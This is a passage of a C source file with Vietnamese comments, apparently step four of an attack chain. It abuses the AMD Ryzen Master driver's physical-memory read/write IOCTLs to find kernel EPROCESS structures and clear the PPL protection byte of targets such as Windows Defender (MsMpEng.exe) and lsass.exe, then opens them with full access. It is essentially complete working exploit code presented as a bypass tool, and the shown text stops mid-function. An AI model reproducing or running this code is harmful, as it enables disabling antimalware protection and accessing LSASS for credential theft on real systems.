/*
 * step4_ppl_bypass.c — PPL Bypass via AMDRyzenMasterDriverV20
 *
 * Usage:
 *   step4_ppl_bypass.exe                → list all PPL processes
 *   step4_ppl_bypass.exe MsMpEng.exe   → bypass PPL cho Windows Defender
 *   step4_ppl_bypass.exe lsass.exe     → bypass PPL cho LSASS
 *
 * Chain:
 *   1. Lấy PID của target từ CreateToolhelp32Snapshot (ground truth)
 *   2. Scan physical memory → tìm EPROCESS theo PID + name
 *   3. Đọc PS_PROTECTION byte (EPROCESS+0x87A)
 *   4. Confirm trước khi patch
 *   5. phys_write(eproc_pa + OFF_PROT, 0x00) → xóa PPL
 *   6. OpenProcess(PROCESS_ALL_ACCESS) → verify thành công
 *   7. Restore PS_PROTECTION ngay lập tức
 *
 * PS_PROTECTION byte layout (Win10 / Win11 <24H2):
 *   bits [2:0] = Type   (0=None, 1=PPL, 2=PP)
 *   bits [3]   = Audit  (usually 0)
 *   bits [7:4] = Signer (0=None..3=Antimalware..6=WinTcb..7=WinSystem)
 *
 * Build:
 *   cl /nologo /W3 /O2 step4_ppl_bypass.c /link kernel32.lib advapi32.lib
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

/* ── SystemHandleInformation ─────────────────────────────────────────────────
 * NtQuerySystemInformation(16) trả về tất cả handles trong system, mỗi entry
 * có trường Object = kernel VA của object (EPROCESS với process handle).
 * Đây là cách duy nhất lấy authoritative EPROCESS VA mà không cần scan.
 *
 * PROCESS_QUERY_LIMITED_INFORMATION có thể open PPL process từ unprotected
 * caller (Windows cho phép by design từ Win8+).
 * ─────────────────────────────────────────────────────────────────────────── */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG, PVOID, ULONG, PULONG);

/* NO #pragma pack — Windows x64 returns 24-byte entries (4 bytes trailing
 * padding after ULONG to align PVOID in next array element to 8 bytes).
 * Using packed 20-byte struct would misalign every entry after index 0. */
typedef struct {
    USHORT  UniqueProcessId;       /* +0  */
    USHORT  CreatorBackTraceIndex; /* +2  */
    UCHAR   ObjectTypeIndex;       /* +4  */
    UCHAR   HandleAttributes;      /* +5  */
    USHORT  HandleValue;           /* +6  */
    PVOID   Object;                /* +8  — kernel VA của EPROCESS */
    ULONG   GrantedAccess;         /* +16 */
                                   /* +20 — 4 bytes padding → struct = 24 bytes */
} SHI_ENTRY;

typedef struct {
    ULONG     NumberOfHandles;     /* +0  */
    SHI_ENTRY Handles[1];          /* +4  (NOT +8, first entry naturally fits) */
} SHI;

static uint64_t get_eproc_va_by_pid(uint32_t target_pid)
{
    /* Mở target với LIMITED access — được phép ngay cả với PPL process */
    HANDLE hTarget = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
    if (!hTarget) {
        printf("    [-] OpenProcess(QUERY_LIMITED, %u): err=%lu\n",
               target_pid, GetLastError());
        return 0;
    }

    PFN_NTQSI NtQSI = (PFN_NTQSI)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) { CloseHandle(hTarget); return 0; }

    /* Tăng buffer cho đến khi NtQSI thành công */
    ULONG sz = 0x100000;
    SHI *buf = NULL;
    NTSTATUS st;
    do {
        free(buf);
        sz += 0x10000;
        buf = (SHI*)malloc(sz);
        if (!buf) { CloseHandle(hTarget); return 0; }
        st = NtQSI(16, buf, sz, NULL);
    } while (st == (NTSTATUS)0xC0000004L);  /* STATUS_INFO_LENGTH_MISMATCH */

    uint64_t result = 0;
    if (st == 0) {
        DWORD my_pid = GetCurrentProcessId();
        for (ULONG i = 0; i < buf->NumberOfHandles; i++) {
            /* Tìm entry thuộc process của mình với handle == hTarget */
            if ((DWORD)buf->Handles[i].UniqueProcessId != my_pid) continue;
            if ((HANDLE)(ULONG_PTR)buf->Handles[i].HandleValue != hTarget) continue;
            result = (uint64_t)buf->Handles[i].Object;
            break;
        }
    }

    free(buf);
    CloseHandle(hTarget);
    return result;
}

/* ── Driver ─────────────────────────────────────────────────────────────── */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu

/* ── EPROCESS offsets Win10 / Win11 <24H2 (19041–25398) ─────────────────── */
#define OFF_DTB    0x028
#define OFF_PID    0x440
#define OFF_FLINK  0x448
#define OFF_BLINK  0x450
#define OFF_TOKEN  0x4B8
#define OFF_PEB    0x550
#define OFF_NAME   0x5A8
#define EPROC_SZ   (OFF_NAME + 16)

/* OFF_PROT detected at runtime — see detect_prot_offset() */
static uint32_t OFF_PROT = 0x87A;

/* ── Physical ranges ─────────────────────────────────────────────────────── */
#define MAX_RANGES 64
#define MAX_PROCS  512
typedef struct { uint64_t base, size; } PhysRange;

typedef struct {
    uint64_t pa;
    uint64_t cr3;    /* DirectoryTableBase — dùng cho va_to_pa */
    uint64_t flink;  /* ActiveProcessLinks.Flink VA — dùng cho list walk */
    uint32_t pid;
    uint8_t  prot;
    char     name[16];
} EprocEntry;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;
static HANDLE    g_dev = INVALID_HANDLE_VALUE;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i=0;;i++) {
        vn=sizeof vname; vd=0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS) {sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20) { free(buf); return; }
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0; i<cnt&&g_nranges<MAX_RANGES; i++,p+=20) {
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size)
            return 1;
    return 0;
}

/* ── Cache eviction ─────────────────────────────────────────────────────────
 * Driver dùng MmMapIoSpace(MmNonCached) → write đi thẳng vào DRAM, bypass
 * hoàn toàn CPU cache. Kernel đọc EPROCESS qua WB (Write-Back) virtual mapping
 * → vẫn thấy giá trị cũ trong L1/L2/L3.
 *
 * Fix: sau khi write, thrash user-mode memory để fill L1/L2/L3 và evict
 * cache line của EPROCESS. Kernel sẽ phải fetch lại từ DRAM → thấy giá trị mới.
 * ─────────────────────────────────────────────────────────────────────────── */
#define THRASH_SIZE (64 * 1024 * 1024)  /* 64MB > L3 của hầu hết Ryzen */

static void cache_evict(void)
{
    volatile uint8_t *buf = (volatile uint8_t *)
        VirtualAlloc(NULL, THRASH_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { Sleep(200); return; }

    /* Write mỗi cache line (64 bytes) để fill L1/L2/L3 và evict stale entries */
    for (size_t i = 0; i < THRASH_SIZE; i += 64)
        buf[i] = (uint8_t)(i >> 6);

    /* Read lại để đảm bảo writes đã hoàn thành và cache lines được allocated */
    volatile uint64_t sink = 0;
    for (size_t i = 0; i < THRASH_SIZE; i += 64)
        sink ^= buf[i];
    (void)sink;

    VirtualFree((LPVOID)buf, 0, MEM_RELEASE);
    Sleep(50);  /* thêm thời gian để cache hierarchy ổn định */
}

/* ── Phys R/W ────────────────────────────────────────────────────────────── */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa, sz};
    uint32_t out_sz = 12+sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz); if (!out) return 0;
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                              &in, sizeof(in), out, out_sz, &got, NULL);
    if (ok && got>=12) memcpy(buf, out+12, sz);
    free(out); return ok && got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) {
        printf("  [!] BLOCKED write 0x%llX\n", (unsigned long long)pa); return 0;
    }
    uint32_t in_sz = 12+sz;
    uint8_t *in_buf = (uint8_t*)malloc(in_sz); if (!in_buf) return 0;
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    memcpy(in_buf+12, data, sz);
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                              in_buf, in_sz, NULL, 0, &got, NULL);
    free(in_buf); return ok;
}

/* ── PS_PROTECTION decode ────────────────────────────────────────────────── */
static const char *prot_type_name(uint8_t t)
{
    switch (t & 0x7) {
        case 0: return "None";
        case 1: return "PPL";
        case 2: return "PP";
        default: return "?";
    }
}
static const char *prot_signer_name(uint8_t s)
{
    static const char *tbl[] = {
        "None","Authenticode","CodeGen","Antimalware",
        "Lsa","Windows","WinTcb","WinSystem"
    };
    return (s < 8) ? tbl[s] : "?";
}
static void prot_print(uint8_t level)
{
    uint8_t type   = level & 0x7;
    uint8_t signer = (level >> 4) & 0xF;
    printf("0x%02X  (%s/%s)", level,
           prot_signer_name(signer), prot_type_name(type));
}

/* ── Detect OFF_PROT based on Windows build ──────────────────────────────── */
static void detect_prot_offset(void)
{
    typedef LONG (WINAPI *pfnRtlGetVersion)(OSVERSIONINFOW*);
    OSVERSIONINFOW ov = {sizeof(ov)};
    pfnRtlGetVersion fn = (pfnRtlGetVersion)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (fn) fn(&ov);
    printf("[*] Windows build: %lu\n", ov.dwBuildNumber);
    if (ov.dwBuildNumber >= 26100) {
        OFF_PROT = 0x4FA;
        printf("[*] Win11 24H2+ → OFF_PROT = 0x4FA\n");
        printf("    NOTE: EPROCESS offsets (PID/TOKEN/NAME) cũng khác, cần cập nhật\n");
    } else {
        OFF_PROT = 0x87A;
        printf("[*] Win10/Win11 <24H2 → OFF_PROT = 0x87A\n");
    }
}

/* ── VA → PA via 4-level page table walk ────────────────────────────────────
 * Dùng CR3 của System process để translate kernel VA → physical address.
 * Enables fast EPROCESS list walk thay vì scan toàn bộ RAM.
 * ─────────────────────────────────────────────────────────────────────────── */
static int va_to_pa(uint64_t cr3, uint64_t va, uint64_t *pa_out)
{
    /* PML4 */
    uint64_t e = 0;
    uint64_t tbl = cr3 & 0x000FFFFFFFFFF000ULL;
    if (!phys_read(tbl + ((va >> 39) & 0x1FF) * 8, &e, 8) || !(e & 1)) return 0;

    /* PDPT */
    tbl = e & 0x000FFFFFFFFFF000ULL;
    if (!phys_read(tbl + ((va >> 30) & 0x1FF) * 8, &e, 8) || !(e & 1)) return 0;
    if (e & 0x80) { /* 1GB huge page */
        *pa_out = (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL); return 1;
    }

    /* PD */
    tbl = e & 0x000FFFFFFFFFF000ULL;
    if (!phys_read(tbl + ((va >> 21) & 0x1FF) * 8, &e, 8) || !(e & 1)) return 0;
    if (e & 0x80) { /* 2MB huge page */
        *pa_out = (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL); return 1;
    }

    /* PT */
    tbl = e & 0x000FFFFFFFFFF000ULL;
    if (!phys_read(tbl + ((va >> 12) & 0x1FF) * 8, &e, 8) || !(e & 1)) return 0;
    *pa_out = (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
    return 1;
}

/* va_to_pa với debug — in ra level nào fail */
static int va_to_pa_dbg(uint64_t cr3, uint64_t va, uint64_t *pa_out)
{
    uint64_t e = 0;
    uint64_t tbl = cr3 & ~0xFFFULL;
    uint64_t idx;

    idx = (va>>39)&0x1FF;
    if (!phys_read(tbl + idx*8, &e, 8)) { printf("      PML4[%llu] @ 0x%llX: phys_read FAIL\n", idx, tbl+idx*8); return 0; }
    if (!(e&1)) { printf("      PML4[%llu]=0x%llX: not present\n", idx, e); return 0; }
    printf("      PML4[%llu]=0x%llX OK\n", idx, e);

    tbl = e & ~0xFFFULL;
    idx = (va>>30)&0x1FF;
    if (!phys_read(tbl + idx*8, &e, 8)) { printf("      PDPT[%llu] @ 0x%llX: phys_read FAIL\n", idx, tbl+idx*8); return 0; }
    if (!(e&1)) { printf("      PDPT[%llu]=0x%llX: not present\n", idx, e); return 0; }
    if (e & 0x80) { *pa_out = (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFFULL); printf("      1GB page OK\n"); return 1; }
    printf("      PDPT[%llu]=0x%llX OK\n", idx, e);

    tbl = e & ~0xFFFULL;
    idx = (va>>21)&0x1FF;
    if (!phys_read(tbl + idx*8, &e, 8)) { printf("      PD[%llu] @ 0x%llX: phys_read FAIL\n", idx, tbl+idx*8); return 0; }
    if (!(e&1)) { printf("      PD[%llu]=0x%llX: not present\n", idx, e); return 0; }
    if (e & 0x80) { *pa_out = (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFFULL); printf("      2MB page OK\n"); return 1; }
    printf("      PD[%llu]=0x%llX OK\n", idx, e);

    tbl = e & ~0xFFFULL;
    idx = (va>>12)&0x1FF;
    if (!phys_read(tbl + idx*8, &e, 8)) { printf("      PT[%llu] @ 0x%llX: phys_read FAIL\n", idx, tbl+idx*8); return 0; }
    if (!(e&1)) { printf("      PT[%llu]=0x%llX: not present\n", idx, e); return 0; }
    *pa_out = (e&~0xFFFULL)|(va&0xFFFULL);
    printf("      PT[%llu]=0x%llX → PA=0x%llX\n", idx, e, *pa_out);
    return 1;
}

/* Read 8 bytes from kernel virtual address using CR3 */
static int vread64(uint64_t cr3, uint64_t va, uint64_t *out)
{
    uint64_t pa;
    if (!va_to_pa(cr3, va, &pa)) return 0;
    return phys_read(pa, out, 8);
}

/* Read 1 byte from kernel virtual address using CR3 */
static int vread8(uint64_t cr3, uint64_t va, uint8_t *out)
{
    uint64_t pa;
    if (!va_to_pa(cr3, va, &pa)) return 0;
    return phys_read(pa, out, 1);
}

/* Read up to 15 chars of ImageFileName from kernel VA */
static int vread_name(uint64_t cr3, uint64_t va, char *out, int len)
{
    for (int i = 0; i < len; i++) {
        if (!vread8(cr3, va + i, (uint8_t*)(out + i))) return 0;
        if (out[i] == 0) break;
    }
    out[len-1] = 0;
    return 1;
}

/* ── Fast EPROCESS list walk via ActiveProcessLinks ─────────────────────────
 * O(processes) ≈ 200 steps thay vì O(RAM).
 *
 * Yêu cầu: sys_ep phải đã được tìm thấy (có CR3 và Flink hợp lệ).
 *
 * list mode  (target_pid == 0): thu thập TẤT CẢ processes
 * bypass mode (target_pid != 0): dừng khi tìm thấy target
 * ─────────────────────────────────────────────────────────────────────────── */
static int walk_eprocess_list(uint64_t sys_cr3, uint64_t sys_flink_va,
                              uint32_t target_pid,
                              EprocEntry *out, int max_out)
{
    int count = 0;
    uint64_t cur_flink_va = sys_flink_va;  /* VA của Flink field của process đầu tiên */

    for (int step = 0; step < 1024; step++) {
        /* cur_flink_va là VA của EPROCESS.ActiveProcessLinks.Flink */
        uint64_t eproc_va = cur_flink_va - OFF_FLINK;

        /* Đọc PID — dùng continue thay break để không abort sớm */
        uint64_t pid = 0;
        if (!vread64(sys_cr3, eproc_va + OFF_PID, &pid)) goto next;
        if (pid == 0 || pid > 0xFFFF) goto next;

        /* Về System → đã vòng hết list */
        if (pid == 4) break;

        /* Filter theo target nếu ở bypass mode */
        if (target_pid != 0 && (uint32_t)pid != target_pid) goto next;

        {
            /* Đọc name */
            char name[16] = {0};
            if (!vread_name(sys_cr3, eproc_va + OFF_NAME, name, 16)) goto next;

            /* Đọc token và CR3 để validate */
            uint64_t token = 0, cr3 = 0;
            if (!vread64(sys_cr3, eproc_va + OFF_TOKEN, &token)) goto next;
            if (!vread64(sys_cr3, eproc_va + OFF_DTB, &cr3))    goto next;

            if ((token & ~0xFULL) < 0xFFFF800000000000ULL) goto next;
            if (!cr3 || cr3 & 0xFFF) goto next;

            /* Đọc Protection byte */
            uint8_t prot = 0;
            uint64_t prot_pa = 0;
            if (va_to_pa(sys_cr3, eproc_va + OFF_PROT, &prot_pa))
                phys_read(prot_pa, &prot, 1);

            /* Lấy PA của EPROCESS để write sau này */
            uint64_t eproc_pa = 0;
            va_to_pa(sys_cr3, eproc_va, &eproc_pa);

            if (count < max_out) {
                out[count].pa   = eproc_pa;
                out[count].pid  = (uint32_t)pid;
                out[count].prot = prot;
                strncpy(out[count].name, name, 15);
                out[count].name[15] = 0;
                count++;
            }

            if (target_pid != 0 && (uint32_t)pid == target_pid) break;
        }

next:
        /* Đọc Flink → bước tới process tiếp theo
         * Nếu đọc Flink fail → break (list bị corrupt hoặc hết) */
        uint64_t next_flink_va = 0;
        if (!vread64(sys_cr3, cur_flink_va, &next_flink_va)) break;
        if (next_flink_va == sys_flink_va) break;  /* vòng lại điểm đầu */
        if (next_flink_va < 0xFFFF800000000000ULL) break;  /* invalid VA */
        cur_flink_va = next_flink_va;
    }

    return count;
}

/* ── Toolhelp: get PID by process name ──────────────────────────────────── */
static uint32_t toolhelp_get_pid(const char *target_name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof(pe)};
    uint32_t found_pid = 0;
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, target_name) == 0) {
                found_pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return found_pid;
}

/* ── Physical EPROCESS scan ─────────────────────────────────────────────── */
/*
 * scan_system_eproc(): tìm System EPROCESS (PID=4) trong physical memory.
 * Dừng ngay khi tìm thấy → thường rất nhanh vì System ở low memory.
 * Sau đó dùng walk_eprocess_list() để tìm các processes khác (O(N) thay O(RAM)).
 */
/* Read chunk — phys_read nhưng fallback từng page nếu large read fail */
#define SCAN_CHUNK 0x10000  /* 64KB: 16x ít IOCTL hơn so với 4KB/page */
static uint8_t g_chunk_buf[SCAN_CHUNK];

static int scan_system_eproc(EprocEntry *sys_out)
{
    uint8_t ep[EPROC_SZ];
    for (int ri=0; ri<g_nranges; ri++) {
        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t chunk_pa=g_ranges[ri].base; chunk_pa<end; chunk_pa+=SCAN_CHUNK) {
            uint64_t csz = end - chunk_pa;
            if (csz > SCAN_CHUNK) csz = SCAN_CHUNK;
            if (!phys_read(chunk_pa, g_chunk_buf, (uint32_t)csz)) continue;

            for (uint64_t off=0; off+8<=csz; off+=8) {
                if (g_chunk_buf[off] != 'S') continue;
                uint64_t abs_pa = chunk_pa + off;
                uint64_t epa = abs_pa - OFF_NAME;
                if (!pa_in_range(epa, EPROC_SZ)) continue;

                /* Nếu EPROCESS nằm trong chunk hiện tại thì dùng luôn, không cần IOCTL thêm */
                if (epa >= chunk_pa && epa + EPROC_SZ <= chunk_pa + csz) {
                    memcpy(ep, g_chunk_buf + (epa - chunk_pa), EPROC_SZ);
                } else {
                    if (!phys_read(epa, ep, EPROC_SZ)) continue;
                }

                uint64_t pid = *(uint64_t*)(ep+OFF_PID);
                if (pid != 4) continue;
                if (memcmp(ep+OFF_NAME, "System\0", 7) != 0) continue;
                uint64_t token = *(uint64_t*)(ep+OFF_TOKEN);
                uint64_t cr3   = *(uint64_t*)(ep+OFF_DTB);
                uint64_t flink = *(uint64_t*)(ep+OFF_FLINK);
                uint64_t blink = *(uint64_t*)(ep+OFF_BLINK);
                uint64_t peb   = *(uint64_t*)(ep+OFF_PEB);
                if ((token & ~0xFULL) < 0xFFFF800000000000ULL) continue;
                if (!cr3 || (cr3&0xFFF) || cr3>0x10000000000ULL) continue;
                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;
                if (peb != 0) continue;
                sys_out->pa    = epa;
                sys_out->cr3   = cr3;
                sys_out->flink = flink;
                sys_out->pid   = 4;
                sys_out->prot  = 0;
                phys_read(epa + OFF_PROT, &sys_out->prot, 1);
                memcpy(sys_out->name, ep+OFF_NAME, 15); sys_out->name[15] = 0;
                return 1;
            }
        }
    }
    return 0;
}

/* Scan đầy đủ — fallback nếu walk_eprocess_list thất bại */
static int scan_eprocess(uint32_t target_pid, uint32_t self_pid,
                         EprocEntry *out, int max_out)
{
    /* Dùng g_chunk_buf (64KB) để giảm số IOCTL từ 4M xuống ~250K cho 16GB RAM */
    uint8_t ep[EPROC_SZ];
    uint64_t last_prog = 0;
    int count = 0;

    uint32_t seen_pids[MAX_PROCS] = {0};
    int      n_seen = 0;

    int list_mode  = (target_pid == 0);
    int found_sys  = 0;
    (void)self_pid;

    for (int ri=0; ri<g_nranges; ri++) {
        if (!list_mode && found_sys && count >= max_out) break;

        uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
        for (uint64_t chunk_pa=g_ranges[ri].base; chunk_pa<end; chunk_pa+=SCAN_CHUNK) {
            if (!list_mode && found_sys && count >= max_out) goto done;

            if (chunk_pa - last_prog >= 0x40000000ULL) {
                printf("  [%5llu MB]\n", (unsigned long long)(chunk_pa>>20));
                last_prog = chunk_pa;
            }
            uint64_t csz = end - chunk_pa;
            if (csz > SCAN_CHUNK) csz = SCAN_CHUNK;
            if (!phys_read(chunk_pa, g_chunk_buf, (uint32_t)csz)) continue;

            for (uint64_t off=0; off+8<=csz; off+=8) {
                uint8_t c = g_chunk_buf[off];
                if (c<'A'||c>'z'||c=='['||c=='\\'||c==']'||c=='^'||c=='`') continue;

                uint64_t abs_pa = chunk_pa + off;
                uint64_t epa = abs_pa - OFF_NAME;
                if (!pa_in_range(epa, EPROC_SZ)) continue;

                /* Reuse chunk buffer nếu EPROCESS fits bên trong */
                if (epa >= chunk_pa && epa + EPROC_SZ <= chunk_pa + csz) {
                    memcpy(ep, g_chunk_buf + (epa - chunk_pa), EPROC_SZ);
                } else {
                    if (!phys_read(epa, ep, EPROC_SZ)) continue;
                }

                uint64_t pid = *(uint64_t*)(ep+OFF_PID);
                if (pid==0 || pid>0xFFFF) continue;
                if (memcmp(ep+OFF_NAME, g_chunk_buf+off, 4)) continue;

                /* Name: printable ASCII */
                int ok = 1;
                for (int k=0; k<15; k++) {
                    uint8_t nc=ep[OFF_NAME+k]; if (nc==0) break;
                    if (nc<0x20||nc>0x7E) { ok=0; break; }
                }
                if (!ok) continue;

                uint64_t token = *(uint64_t*)(ep+OFF_TOKEN);
                uint64_t cr3   = *(uint64_t*)(ep+OFF_DTB);
                uint64_t flink = *(uint64_t*)(ep+OFF_FLINK);
                uint64_t blink = *(uint64_t*)(ep+OFF_BLINK);

                if ((token & ~0xFULL) < 0xFFFF800000000000ULL) continue;
                if (!cr3 || (cr3&0xFFF) || cr3>0x10000000000ULL) continue;
                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

                /* System process: name must be "System" exactly + no PEB */
                if (pid == 4) {
                    if (memcmp(ep+OFF_NAME, "System\0", 7) != 0) continue;
                    uint64_t peb = *(uint64_t*)(ep+OFF_PEB);
                    if (peb != 0) continue;
                }

                uint32_t upid = (uint32_t)pid;

                /* In bypass mode: only keep System (pid=4), target, and self */
                if (!list_mode) {
                    if (upid != 4 && upid != target_pid && upid != self_pid) continue;
                }

                /* Dedup strategy:
                 * - target_pid / self_pid: dedup by PA (collect all physical copies)
                 * - all others: dedup by PID to avoid bloat */
                if (!list_mode && (upid == target_pid || upid == self_pid)) {
                    int dup = 0;
                    for (int k=0; k<count; k++)
                        if (out[k].pid == upid && out[k].pa == epa) { dup=1; break; }
                    if (dup) continue;
                } else {
                    int dup = 0;
                    for (int k=0; k<n_seen; k++) if (seen_pids[k]==upid) { dup=1; break; }
                    if (dup) continue;
                    if (n_seen < MAX_PROCS) seen_pids[n_seen++] = upid;
                }

                /* Read Protection byte (at higher offset, outside EPROC_SZ buffer) */
                uint8_t prot = 0;
                phys_read(epa + OFF_PROT, &prot, 1);

                if (count < max_out) {
                    out[count].pa   = epa;
                    out[count].pid  = upid;
                    out[count].prot = prot;
                    memcpy(out[count].name, ep+OFF_NAME, 15);
                    out[count].name[15] = 0;

                    if (upid == 4) found_sys = 1;
                    count++;
                }
            }
        }
    }
done:
    return count;
}

/* ══════════════════════════════════════════════════════════════════════════ */
int main(int argc, char **argv)
{
    const char *target_name = (argc >= 2) ? argv[1] : NULL;
    printf("=== Step 4: PPL Bypass ===\n\n");

    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev==INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device: %lu\n", GetLastError()); return 1;
    }
    printf("[+] Device opened\n\n");

    detect_prot_offset();
    printf("\n");

    load_ranges();
    printf("[1] Physical ranges: %d\n\n", g_nranges);

    /* ── STEP 1: Tìm System EPROCESS (fast — stop ngay khi found) ───────── */
    printf("[2] Finding System EPROCESS (fast scan — stop on first match)...\n");
    EprocEntry sys_ep = {0};
    int sys_found = scan_system_eproc(&sys_ep);
    if (!sys_found) {
        printf("    [!] System EPROCESS not found — va_to_pa and list walk unavailable\n\n");
    } else {
        printf("    System PA    = 0x%016llX  CR3=0x%016llX\n",
               (unsigned long long)sys_ep.pa, (unsigned long long)sys_ep.cr3);
        printf("    Flink VA     = 0x%016llX\n\n",
               (unsigned long long)sys_ep.flink);
    }

    /* ── LIST MODE ────────────────────────────────────────────────────────── */
    if (!target_name) {
        printf("[3] List mode...\n");
        EprocEntry *entries = (EprocEntry*)calloc(MAX_PROCS, sizeof(EprocEntry));
        if (!entries) return 1;

        /* Try list walk first (fast), fallback to physical scan if CR3 stale */
        int n = 0;
        if (sys_found && sys_ep.cr3)
            n = walk_eprocess_list(sys_ep.cr3, sys_ep.flink, 0, entries, MAX_PROCS);

        if (n == 0) {
            printf("    List walk failed (CR3 stale) — physical scan (slow ~5min)...\n");
            n = scan_eprocess(0, GetCurrentProcessId(), entries, MAX_PROCS);
        }

        printf("[*] Found %d processes. PPL list:\n\n", n);
        printf("    %-6s  %-20s  %s\n", "PID", "Name", "Protection");
        printf("    %-6s  %-20s  %s\n", "------", "--------------------", "-------------------------");

        int ppl_count = 0;
        for (int i=0; i<n; i++) {
            if (entries[i].prot == 0) continue;
            printf("    %-6u  %-20s  ", entries[i].pid, entries[i].name);
            prot_print(entries[i].prot);
            printf("\n");
            ppl_count++;
        }
        if (ppl_count == 0)
            printf("    (none found — OFF_PROT might be wrong)\n");

        printf("\nRun with process name to bypass: step4_ppl_bypass.exe MsMpEng.exe\n");
        free(entries);
        CloseHandle(g_dev);
        return 0;
    }

    /* ── BYPASS MODE ─────────────────────────────────────────────────────── */
    printf("[3] Target: %s\n", target_name);
    uint32_t target_pid = toolhelp_get_pid(target_name);
    if (!target_pid) {
        printf("[-] Process '%s' not found\n", target_name);
        CloseHandle(g_dev); return 1;
    }
    printf("    PID (toolhelp) = %u\n\n", target_pid);

    HANDLE h_before = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (h_before) {
        printf("[!] OpenProcess succeeded without bypass — may not have PPL\n");
        CloseHandle(h_before);
    } else {
        printf("[*] OpenProcess before bypass: FAILED (err=%lu) — PPL active\n\n", GetLastError());
    }

    /* ── Validate CR3 — dùng cross-check SHI thay vì KUSD ─────────────────
     * KUSD validation fail trên Win11 KVA-Shadow vì page table pages của System
     * không luôn được map vào MmMapIoSpace region. Cross-check đáng tin hơn:
     * lấy EPROCESS VA của System từ SHI (authoritative) → va_to_pa(cr3, va)
     * phải trả về đúng sys_ep.pa → CR3 valid.
     * ─────────────────────────────────────────────────────────────────────── */
    int cr3_valid = 0;
    uint64_t tgt_eproc_va = 0;

    if (sys_found) {
        printf("[4] Validating System CR3=0x%llX via SHI cross-check...\n",
               (unsigned long long)sys_ep.cr3);

        /* Lấy EPROCESS VA của System process (PID=4) qua SHI */
        uint64_t sys_eproc_va = get_eproc_va_by_pid(4);
        if (sys_eproc_va) {
            uint64_t check_pa = 0;
            if (va_to_pa(sys_ep.cr3, sys_eproc_va, &check_pa)) {
                /* Cho phép lệch ±4KB (page align) vì EPROCESS có thể không page-aligned
                 * nhưng page chứa nó phải match */
                if ((check_pa & ~0xFFFULL) == (sys_ep.pa & ~0xFFFULL)) {
                    cr3_valid = 1;
                    printf("    SHI VA=0x%016llX → PA=0x%016llX  [CR3 VALID]\n\n",
                           (unsigned long long)sys_eproc_va,
                           (unsigned long long)check_pa);
                } else {
                    printf("    PA mismatch: expected≈0x%llX got=0x%llX  [CR3 STALE]\n\n",
                           (unsigned long long)sys_ep.pa, (unsigned long long)check_pa);
                }
            } else {
                /* va_to_pa fail — thử KUSD như fallback */
                printf("    va_to_pa(System) fail — fallback KUSD check...\n");
                const uint64_t KUSD_VA = 0xFFFFF78000000000ULL;
                uint64_t kusd_pa = 0;
